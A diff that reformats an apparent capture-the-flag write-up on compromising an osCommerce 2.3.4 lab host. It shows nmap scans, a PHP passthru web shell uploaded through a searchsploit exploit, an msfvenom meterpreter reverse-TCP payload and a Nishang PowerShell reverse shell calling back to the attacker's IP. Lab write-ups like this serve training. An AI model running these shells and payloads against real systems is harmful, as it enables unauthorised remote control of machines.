@@ -10,7 +10,7 @@ export myIP=10.13.24.71
 
 Let's kick things off with a fast nmap scan to get a lay of the land.
 
-nmap -F $IP
+`nmap -F $IP`
 
 Nmap scan report for 10.10.85.154
 Host is up (0.33s latency).
@@ -31,8 +31,8 @@ Nmap done: 1 IP address (1 host up) scanned in 2.63 seconds
 
 Now we'll do a follow-up scan to get more details about open ports, services, and software versions.
 
-nmap -p 80,135,443,3306,8080,49152,49153,49154 -sC -sV -A -T4 $IP
-
+`nmap -p 80,135,443,3306,8080,49152,49153,49154 -sC -sV -A -T4 $IP
+`
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-28 23:20 EDT
 Stats: 0:01:06 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
 NSE Timing: About 96.65% done; ETC: 23:21 (0:00:00 remaining)
@@ -88,15 +88,15 @@ Nmap done: 1 IP address (1 host up) scanned in 79.26 seconds
 
 Next, let's do a bit of directory busting with gobuster and dirb. We discovered a /catalog/install directory that we can use to install the database and create an admin user.
 
-'oscommerce-2.3.4/catalog/install'
-
+`oscommerce-2.3.4/catalog/install
+`
 Now we can upload a simple passthrough to allow in-browser command execution. 
 **
 EXPLOITATION**
 
 Next. let's create a shell.php file with the following contents for our passthru shell:
-'<?php passthru($_GET['cmd']); ?>'
-
+`<?php passthru($_GET['cmd']); ?>
+`
 And we can upload it using the exploit from searchsploit:
 'python 43191.py -u http://10.10.51.155:8080/oscommerce-2.3.4 --auth=admin:admin -f shell.php'
 
@@ -107,10 +107,10 @@ We can test our php passthru shell a simple command like 'whoami'.
 **Using Metasploit to convert RCE to a fully interactive shell**
 
 First let's create a payload.
+`
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.13.24.71 LPORT=7777 -f exe > shell.exe`
 
-'msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.13.24.71 LPORT=7777 -f exe > shell.exe'
-
-'msfconsole'
+`msfconsole`
 
 Now we can let it rip and catch the shell with the web_delivery module.
 
@@ -141,8 +141,8 @@ Nishang Powershell:
 1. download Invoke-PowerShellTcp.ps1
 
 2. modify the script to add the command to the end of the script
-
-'Invoke-PowerShellTcp -Reverse -IPAddress 10.13.24.71 -Port 80'
+`
+Invoke-PowerShellTcp -Reverse -IPAddress 10.13.24.71 -Port 80`
 
 3. host an http server on port 80
 
